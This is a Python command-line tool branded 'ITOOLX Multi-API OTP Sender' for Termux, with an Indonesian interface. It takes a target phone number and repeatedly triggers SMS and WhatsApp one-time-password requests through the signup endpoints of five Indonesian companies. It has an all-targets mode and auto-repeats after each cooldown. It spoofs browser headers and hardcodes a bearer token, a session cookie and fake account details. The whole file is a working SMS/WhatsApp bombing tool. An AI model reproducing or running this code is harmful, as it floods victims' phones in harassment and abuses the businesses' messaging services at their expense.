#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import json
import time
import sys
import os
from datetime import datetime

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.prompt import Prompt, IntPrompt
    from rich.align import Align
    from rich.live import Live
    from rich.columns import Columns
    from rich.text import Text
    from rich import box
    from rich.rule import Rule
    from rich.layout import Layout
except ImportError:
    os.system("pip install rich -q")
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.prompt import Prompt, IntPrompt
    from rich.align import Align
    from rich.live import Live
    from rich.columns import Columns
    from rich.text import Text
    from rich import box
    from rich.rule import Rule
    from rich.layout import Layout

console = Console()

# ══════════════════════════════════════════════════════
#  GLOBAL STATE
# ══════════════════════════════════════════════════════
cooldown_tracker: dict = {}   # { phone: { method: sent_at } }
success_log: list      = []   # list of result dicts (all successes)
_log_no                = [0]

# ══════════════════════════════════════════════════════
#  CONFIG
# ══════════════════════════════════════════════════════
APIS = {
    1: {"name": "Bunda.co.id",        "desc": "SMS",       "icon": "📱",
        "cooldown": 120, "color": "bright_magenta", "method": "bunda"},
    2: {"name": "OptikMelawai",        "desc": "SMS Reg",   "icon": "👓",
        "cooldown": 60,  "color": "bright_blue",    "method": "optik"},
    3: {"name": "Paper.id SMS",        "desc": "SMS",       "icon": "📄",
        "cooldown": 30,  "color": "bright_green",   "method": "paper_sms"},
    4: {"name": "Paper.id WA",         "desc": "WhatsApp",  "icon": "💬",
        "cooldown": 30,  "color": "bright_yellow",  "method": "paper_wa"},
    5: {"name": "PlanetBan",           "desc": "WhatsApp",  "icon": "🏪",
        "cooldown": 60,  "color": "bright_red",     "method": "planetban"},
    6: {"name": "ALL TARGETS",         "desc": "Semua API", "icon": "⚡",
        "cooldown": 120, "color": "bold cyan",      "method": "all"},
}

UA = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36")

BANNER = """\
[bold cyan] ██╗████████╗ ██████╗  ██████╗ ██╗     ██╗  ██╗
 ██║╚══██╔══╝██╔═══██╗██╔═══██╗██║     ╚██╗██╔╝
 ██║   ██║   ██║   ██║██║   ██║██║      ╚███╔╝ 
 ██║   ██║   ██║   ██║██║   ██║██║      ██╔██╗ 
 ██║   ██║   ╚██████╔╝╚██████╔╝███████╗██╔╝ ██╗
 ╚═╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝[/bold cyan]"""

# ══════════════════════════════════════════════════════
#  COOLDOWN HELPERS
# ══════════════════════════════════════════════════════

def get_rem(phone: str, method: str, cd: int) -> int:
    sent = cooldown_tracker.get(phone, {}).get(method)
    return 0 if sent is None else max(0, int(cd - (time.time() - sent)))

def set_cd(phone: str, method: str):
    cooldown_tracker.setdefault(phone, {})[method] = time.time()

def fmt(s: int) -> str:
    m, sc = divmod(s, 60)
    return f"{m}m{sc:02d}s" if m else f"{sc}s"

def bar(rem: int, total: int, w: int = 16) -> str:
    if total == 0:
        return "█" * w
    filled = max(0, int((total - rem) / total * w))
    return "█" * filled + "░" * (w - filled)

def is_ok(code: int) -> bool:
    return code in (200, 201, 202)

# ══════════════════════════════════════════════════════
#  SUCCESS LOG
# ══════════════════════════════════════════════════════

def log_ok(phone: str, api: dict, code: int, body: str):
    _log_no[0] += 1
    success_log.append({
        "no":    _log_no[0],
        "ts":    datetime.now().strftime("%H:%M:%S"),
        "date":  datetime.now().strftime("%d/%m"),
        "phone": phone,
        "name":  api["name"],
        "icon":  api["icon"],
        "code":  code,
        "prev":  body[:70].replace("\n", " ") + ("…" if len(body) > 70 else ""),
    })

# ══════════════════════════════════════════════════════
#  API FUNCTIONS
# ══════════════════════════════════════════════════════

def _hdr(**extra):
    h = {
        "User-Agent": UA,
        "Accept": "application/json, text/plain, */*",
        "sec-ch-ua": '"Not;A=Brand";v="8","Chromium";v="150","Android WebView";v="150"',
        "sec-ch-ua-platform": '"Android"',
        "sec-ch-ua-mobile": "?1",
        "accept-language": "id-ID,id;q=0.9",
    }
    h.update(extra)
    return h

def send_bunda(phone: str) -> dict:
    try:
        r = requests.post(
            "https://cms.bunda.co.id/api/v1/auth/send-otp",
            data=json.dumps({"phone_number": int(phone), "type": "auth"}),
            headers=_hdr(**{
                "Content-Type": "application/json", "x-locale": "id",
                "origin": "https://www.bunda.co.id",
                "x-requested-with": "com.chimbori.hermitcrab",
                "referer": "https://www.bunda.co.id/id/hospitals",
            }), timeout=15)
        return {"status": r.status_code, "body": r.text}
    except Exception as e:
        return {"status": 0, "body": str(e)}

def send_optik(phone: str) -> dict:
    try:
        r = requests.post(
            "https://api.optikmelawai.com/api/v3/auth/register/1",
            files=[("name",(None,"Jonuis Dane")),("sex",(None,"1")),
                   ("birth_date",(None,"1995-07-28")),("mobile_number",(None,phone)),
                   ("password",(None,"Pangkey2005?")),("repassword",(None,"Pangkey2005?"))],
            headers=_hdr(**{
                "language": "id",
                "authorization": "Bearer a6a84b1f1e604d683fbef2295c2262373eba254197a1e14ab3a1e95a4394e4debf13560e5dbd66ab1e628aa3e73d3667d",
                "x-unique-user": "GA1.1.883509241.1785170487",
                "origin": "https://optikmelawai.com",
                "x-requested-with": "com.chimbori.hermitcrab",
                "referer": "https://optikmelawai.com/",
                "Cookie": "melawai_session=YJuJgaigHeAbkjFNqgZCzfVj8LZwyFZUjm5ZqntC",
            }), timeout=15)
        return {"status": r.status_code, "body": r.text}
    except Exception as e:
        return {"status": 0, "body": str(e)}

def send_paper(phone: str, method: str = "sms") -> dict:
    try:
        r = requests.post(
            "https://register.paper.id/api/v1/auth/register/send-otp",
            data=json.dumps({"phone": phone, "method": method,
                             "registered_by": "flutter mweb"}),
            headers=_hdr(**{
                "Content-Type": "application/json", "authorization": "",
                "x-paper-user-agent": "multiverse/2.58.1 mobile_web (android) chrome",
                "origin": "https://paper.id",
                "x-requested-with": "com.chimbori.hermitcrab",
                "referer": "https://paper.id/",
            }), timeout=15)
        return {"status": r.status_code, "body": r.text}
    except Exception as e:
        return {"status": 0, "body": str(e)}

def send_planetban(phone: str) -> dict:
    num = phone if phone.startswith("62") else "62" + phone.lstrip("0")
    pb  = "0" + num[2:]
    try:
        r = requests.post(
            "https://api.planetban.com/website/customer/request-otp",
            data=json.dumps({"phone": pb, "purpose": "register", "method": "whatsapp"}),
            headers=_hdr(**{
                "Content-Type": "application/json",
                "origin": "https://planetban.com",
                "x-requested-with": "com.chimbori.hermitcrab",
                "referer": "https://planetban.com/",
            }), timeout=15)
        return {"status": r.status_code, "body": r.text}
    except Exception as e:
        return {"status": 0, "body": str(e)}

def dispatch(method: str, phone: str) -> dict:
    if method == "bunda":     return send_bunda(phone)
    if method == "optik":     return send_optik(phone)
    if method == "paper_sms": return send_paper(phone, "sms")
    if method == "paper_wa":  return send_paper(phone, "whatsapp")
    if method == "planetban": return send_planetban(phone)
    return {}

# ══════════════════════════════════════════════════════
#  RENDERERS — semua return Rich renderable
# ══════════════════════════════════════════════════════

def render_banner() -> Panel:
    return Panel(BANNER, border_style="cyan", padding=(0, 1))


def render_menu(phone: str = "") -> Table:
    t = Table(
        title=(
            f"[bold cyan]⚡ PILIH TARGET[/bold cyan]"
            + (f"  [dim]→ [bright_yellow]{phone}[/bright_yellow][/dim]" if phone else "")
        ),
        box=box.DOUBLE_EDGE, border_style="cyan",
        header_style="bold cyan", show_lines=True,
    )
    t.add_column("No",  width=4,  justify="center", style="bold white")
    t.add_column("",    width=3,  justify="center")
    t.add_column("API", width=18, style="bold")
    t.add_column("Via", width=10)
    t.add_column("CD",  width=9,  justify="center")

    for num, api in APIS.items():
        if phone and api["method"] != "all":
            rem    = get_rem(phone, api["method"], api["cooldown"])
            cd_txt = (f"[bold red]{fmt(rem)}[/bold red]"
                      if rem > 0 else
                      f"[bold green]{api['cooldown']}s[/bold green]")
        else:
            cd_txt = f"[dim]{api['cooldown']}s[/dim]"

        t.add_row(
            f"[cyan]{num}[/cyan]",
            api["icon"],
            f"[{api['color']}]{api['name']}[/{api['color']}]",
            f"[dim]{api['desc']}[/dim]",
            cd_txt,
        )
    t.add_row("[red]0[/red]", "🚪", "[red]EXIT[/red]", "[dim]Keluar[/dim]", "-")
    return t


def render_history(n: int = 5) -> Table:
    """Last-n success log as a compact table."""
    recent = success_log[-n:][::-1]
    t = Table(
        title=f"[bold green]✅ HISTORY SUKSES  ({len(success_log)} total)[/bold green]",
        box=box.SIMPLE_HEAVY, border_style="green",
        header_style="bold green", show_lines=False,
    )
    t.add_column("#",    width=4,  justify="right", style="dim")
    t.add_column("Jam",  width=9,  style="dim")
    t.add_column("Nomor",width=15, style="bold bright_yellow")
    t.add_column("API",  width=18)
    t.add_column("HTTP", width=5,  justify="center")

    if not recent:
        t.add_row("[dim]-[/dim]", "[dim]Belum ada[/dim]", "", "", "")
    for e in recent:
        t.add_row(
            str(e["no"]), e["ts"], e["phone"],
            f"{e['icon']} {e['name']}",
            f"[bold green]{e['code']}[/bold green]",
        )
    return t


def render_cd_table(phone: str, targets: list) -> Table:
    """Per-API cooldown bar table for a given phone."""
    t = Table(
        box=box.SIMPLE_HEAVY, border_style="yellow",
        show_header=False, show_lines=False, padding=(0, 1),
    )
    t.add_column("", width=3,  justify="center")
    t.add_column("", width=18)
    t.add_column("", width=18)
    t.add_column("", width=9,  justify="right")
    t.add_column("", width=10, justify="center")

    for api in targets:
        if api["method"] == "all":
            continue
        rem  = get_rem(phone, api["method"], api["cooldown"])
        sent = cooldown_tracker.get(phone, {}).get(api["method"])
        if rem > 0 and sent:
            b      = bar(rem, api["cooldown"], 16)
            filled = api["cooldown"] - rem
            b_str  = (f"[bold cyan]{'█' * int(filled/api['cooldown']*16)}[/bold cyan]"
                      f"[dim]{'░' * (16 - int(filled/api['cooldown']*16))}[/dim]")
            sisa   = f"[bold red]{fmt(rem)}[/bold red]"
            unlock = datetime.fromtimestamp(sent + api["cooldown"]).strftime("%H:%M:%S")
            status = "[red]🔒[/red]"
        else:
            b_str  = f"[bold green]{'█' * 16}[/bold green]"
            sisa   = "[bold green]READY[/bold green]"
            unlock = "[dim]-[/dim]"
            status = "[green]🔓[/green]"

        t.add_row(
            status,
            f"[{api['color']}]{api['icon']} {api['name']}[/{api['color']}]",
            b_str, sisa, f"[dim]{unlock}[/dim]",
        )
    return t

# ══════════════════════════════════════════════════════
#  LIVE COOLDOWN WAIT  — blokir sampai CD selesai,
#  refresh tiap detik, lalu tanya Y / R / N
# ══════════════════════════════════════════════════════

def wait_cooldown_live(phone: str, targets: list) -> str:
    """
    Tampilkan live countdown sampai semua target READY,
    lalu tanya user: Y = kirim sekali, R = auto-repeat, N = stop.
    Return: 'y' | 'r' | 'n'
    """
    def need_wait() -> int:
        return max(
            (get_rem(phone, a["method"], a["cooldown"]) for a in targets
             if a["method"] != "all"),
            default=0,
        )

    if need_wait() > 0:
        def make_live_panel() -> Panel:
            rows = render_cd_table(phone, targets)
            rem  = need_wait()
            caption = (
                f"[bold yellow]⏳ Menunggu cooldown...  Sisa terlama: "
                f"[bold red]{fmt(rem)}[/bold red][/bold yellow]"
                if rem > 0 else
                "[bold green]🔓 Semua READY![/bold green]"
            )
            return Panel(
                rows,
                title=f"[bold yellow]⏱  COOLDOWN  →  {phone}[/bold yellow]",
                subtitle=caption,
                border_style="yellow",
                padding=(0, 1),
            )

        console.print()
        try:
            with Live(make_live_panel(), console=console,
                      refresh_per_second=1, transient=True) as live:
                while need_wait() > 0:
                    time.sleep(1)
                    live.update(make_live_panel())
        except KeyboardInterrupt:
            console.print("\n[bold red]  ✗ Dihentikan.[/bold red]")
            return "n"

    # ── Prompt setelah semua READY ────────────────────────────────
    console.print()
    console.print(Panel(
        "[bold green]🔓 COOLDOWN SELESAI![/bold green]\n\n"
        "  [bold cyan]Y[/bold cyan]  →  Kirim [bold]sekali[/bold] lagi\n"
        "  [bold cyan]R[/bold cyan]  →  [bold]Auto-repeat[/bold] (terus kirim & tunggu CD otomatis)\n"
        "  [bold cyan]N[/bold cyan]  →  [bold]Stop[/bold], kembali ke menu",
        border_style="green", padding=(1, 2),
    ))
    try:
        choice = Prompt.ask(
            "[bold cyan]  ❯[/bold cyan] Pilihan",
            choices=["y", "r", "n", "Y", "R", "N"],
            default="y",
        ).lower()
    except (KeyboardInterrupt, EOFError):
        return "n"
    return choice

# ══════════════════════════════════════════════════════
#  RESULT PANEL
# ══════════════════════════════════════════════════════

def show_result(api: dict, phone: str, res: dict, round_n: int = 1):
    code  = res.get("status", 0)
    body  = res.get("body", "")
    prev  = body[:90].replace("\n", " ") + ("…" if len(body) > 90 else "")
    ok    = is_ok(code)
    color = "bold green" if ok else ("bold red" if code == 0 else "bold red")
    icon  = "✅" if ok else "⚠️"

    if ok:
        log_ok(phone, api, code, body)
        badge = "  [bold green]✅ +1 History Sukses[/bold green]"
    else:
        badge = ""

    console.print(Panel(
        f"[bold white]API      :[/bold white] {api['icon']} [{api['color']}]{api['name']}[/{api['color']}]\n"
        f"[bold white]Nomor    :[/bold white] [bright_yellow]{phone}[/bright_yellow]\n"
        f"[bold white]Round    :[/bold white] [white]{round_n}[/white]\n"
        f"[bold white]HTTP     :[/bold white] [{color}]{code}[/{color}]\n"
        f"[bold white]Waktu    :[/bold white] [dim]{datetime.now().strftime('%H:%M:%S')}[/dim]\n"
        f"[bold white]Response :[/bold white] [dim]{prev}[/dim]"
        + badge,
        title=f"[bold]{icon} RESULT[/bold]",
        border_style="green" if ok else "red",
        padding=(1, 2),
    ))


def show_all_results(phone: str, results: list, round_n: int):
    t = Table(
        title=f"[bold cyan]⚡ ALL TARGETS  Round {round_n}[/bold cyan]",
        box=box.ROUNDED, border_style="cyan",
        header_style="bold cyan", show_lines=True,
    )
    t.add_column("",      width=3,  justify="center")
    t.add_column("API",   width=20)
    t.add_column("HTTP",  width=6,  justify="center")
    t.add_column("Status",width=10)
    t.add_column("Jam",   width=9)
    for item in results:
        code = item["status"]
        ok   = is_ok(code)
        col  = "bold green" if ok else "bold red"
        stxt = "SUCCESS" if ok else "FAILED"
        t.add_row(
            item["icon"], f"[bold]{item['name']}[/bold]",
            f"[{col}]{code}[/{col}]",
            f"[{col}]{stxt}[/{col}]",
            f"[dim]{item['time']}[/dim]",
        )
    console.print(Align.center(t))

# ══════════════════════════════════════════════════════
#  SEND SESSION — single target
# ══════════════════════════════════════════════════════

def session_single(api: dict, phone: str):
    """Kirim + loop Y/R/N tanpa kembali ke menu sampai user pilih N."""
    round_n = 0
    mode    = "y"   # first run langsung kirim

    while True:
        if mode == "r" and round_n > 0:
            # auto-repeat: tunggu CD lalu kirim
            ans = wait_cooldown_live(phone, [api])
            if ans == "n":
                break
            if ans == "y":
                mode = "y"
            # else stays 'r'

        elif round_n > 0:
            # setelah kirim pertama, tanya Y/R/N
            ans = wait_cooldown_live(phone, [api])
            if ans == "n":
                break
            mode = ans

        # ── Kirim ──────────────────────────────────────────────────
        round_n += 1
        console.print(Rule(f"[bold cyan] ▶  Round {round_n} [/bold cyan]"))
        with console.status(
            f"[bold cyan]Mengirim → [bright_yellow]{api['name']}[/bright_yellow]...",
            spinner="dots",
        ):
            res = dispatch(api["method"], phone)
        set_cd(phone, api["method"])
        show_result(api, phone, res, round_n)

        # Setelah kirim, langsung tampil mini history
        console.print(Align.center(render_history(3)))
        console.print()

        if mode != "r":
            # bukan auto-repeat → tunggu & tanya manual
            ans = wait_cooldown_live(phone, [api])
            if ans == "n":
                break
            mode = ans

# ══════════════════════════════════════════════════════
#  SEND SESSION — ALL targets
# ══════════════════════════════════════════════════════

def session_all(phone: str):
    targets = [v for v in APIS.values() if v["method"] != "all"]
    round_n = 0
    mode    = "y"

    while True:
        if round_n > 0:
            ans = wait_cooldown_live(phone, targets)
            if ans == "n":
                break
            mode = ans

        round_n += 1
        console.print(Rule(f"[bold cyan] ⚡ ALL TARGETS  Round {round_n} [/bold cyan]"))

        results = []
        for api in targets:
            with console.status(
                f"[bold cyan]→ [bright_yellow]{api['name']}[/bright_yellow]...",
                spinner="aesthetic",
            ):
                t   = datetime.now().strftime("%H:%M:%S")
                res = dispatch(api["method"], phone)
                set_cd(phone, api["method"])
                if is_ok(res.get("status", 0)):
                    log_ok(phone, api, res["status"], res.get("body", ""))
                results.append({
                    "name": api["name"], "icon": api["icon"],
                    "status": res.get("status", 0),
                    "body": res.get("body", ""), "time": t,
                })
            time.sleep(0.2)

        show_all_results(phone, results, round_n)
        console.print(Align.center(render_history(3)))
        console.print()

        if mode != "r":
            ans = wait_cooldown_live(phone, targets)
            if ans == "n":
                break
            mode = ans

# ══════════════════════════════════════════════════════
#  HELPERS
# ══════════════════════════════════════════════════════

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def validate_phone(raw: str) -> str:
    p = raw.strip().replace(" ", "").replace("-", "")
    if p.startswith("+62"): return "62" + p[3:]
    if p.startswith("08"):  return "628" + p[2:]
    if p.startswith("8"):   return "62" + p
    return p

def ask_phone(current: str = "") -> str:
    hint = (f" [dim](Enter = {current})[/dim]"
            if current else " [dim](08xxx / 628xxx)[/dim]")
    while True:
        try:
            raw = Prompt.ask(f"[bold cyan]  ❯[/bold cyan] Nomor{hint}")
            if raw.strip() == "" and current:
                return current
            p = validate_phone(raw)
            if len(p) >= 10:
                return p
            console.print("[bold red]  ✗ Nomor tidak valid![/bold red]")
        except (KeyboardInterrupt, EOFError):
            console.print()
            sys.exit(0)

def print_home(phone: str = ""):
    clear()
    console.print(Align.center(BANNER))
    console.print(Align.center(Panel(
        "[bold white]Multi-API OTP Sender[/bold white]  [dim]by[/dim] [bold cyan]ITOOLX[/bold cyan]  [dim]· Termux Edition[/dim]",
        border_style="cyan", padding=(0, 3),
    )))
    console.print()
    console.print(Align.center(render_menu(phone)))
    console.print()
    console.print(Align.center(render_history(4)))
    console.print()

# ══════════════════════════════════════════════════════
#  MAIN LOOP
# ══════════════════════════════════════════════════════

def main():
    current_phone = ""

    while True:
        print_home(current_phone)

        # ── Pilih ────────────────────────────────────────────────────
        try:
            raw    = Prompt.ask("[bold cyan]  ❯[/bold cyan] Pilih target [dim](0=exit)[/dim]")
            choice = int(raw.strip())
        except (ValueError, KeyboardInterrupt, EOFError):
            console.print("[bold red]  ✗ Tidak valid.[/bold red]")
            time.sleep(0.5)
            continue

        if choice == 0:
            console.print(Align.center(Panel(
                "[bold red]👋 Sampai jumpa![/bold red]\n[dim]ITOOLX · Termux Edition[/dim]",
                border_style="red", padding=(1, 4),
            )))
            sys.exit(0)

        if choice not in APIS:
            console.print("[bold red]  ✗ Pilihan tidak ada.[/bold red]")
            time.sleep(0.5)
            continue

        api = APIS[choice]
        console.print(
            f"\n  [bold white]Target :[/bold white] "
            f"[{api['color']}]{api['icon']} {api['name']}[/{api['color']}]"
        )

        # ── Nomor ─────────────────────────────────────────────────
        current_phone = ask_phone(current_phone)
        console.print(
            f"  [bold white]Phone  :[/bold white] "
            f"[bright_yellow]{current_phone}[/bright_yellow]\n"
        )

        # ── Cek cooldown sebelum mulai ─────────────────────────────
        targets = (
            [v for v in APIS.values() if v["method"] != "all"]
            if api["method"] == "all"
            else [api]
        )
        locked = [(a, get_rem(current_phone, a["method"], a["cooldown"]))
                  for a in targets if get_rem(current_phone, a["method"], a["cooldown"]) > 0]

        if locked:
            console.print(Align.center(
                render_cd_table(current_phone, targets)
            ))
            console.print()
            max_rem = max(r for _, r in locked)
            console.print(Panel(
                "\n".join(
                    f"  {a['icon']} [cyan]{a['name']}[/cyan]  →  [bold red]{fmt(r)}[/bold red]"
                    for a, r in locked
                ),
                title="[bold red]🔒 COOLDOWN AKTIF[/bold red]",
                border_style="red", padding=(1, 2),
            ))
            console.print(
                "\n  [bold cyan]Y[/bold cyan] = Tunggu cooldown selesai lalu kirim\n"
                "  [bold cyan]N[/bold cyan] = Batal, kembali ke menu\n"
            )
            try:
                ans = Prompt.ask(
                    "[bold cyan]  ❯[/bold cyan] Pilihan",
                    choices=["y", "n", "Y", "N"], default="y",
                ).lower()
            except (KeyboardInterrupt, EOFError):
                ans = "n"

            if ans != "y":
                continue   # kembali ke menu

        # ── Mulai sesi kirim ───────────────────────────────────────
        console.print()
        try:
            if api["method"] == "all":
                session_all(current_phone)
            else:
                session_single(api, current_phone)
        except KeyboardInterrupt:
            console.print("\n[bold red]  ✗ Dihentikan.[/bold red]")

        # kembali ke menu
        console.print()
        console.print(Align.center(Panel(
            f"[bold green]✅ Sesi selesai[/bold green]  [dim]({len(success_log)} sukses total)[/dim]",
            border_style="green", padding=(0, 3),
        )))
        time.sleep(1.2)


if __name__ == "__main__":
    main()
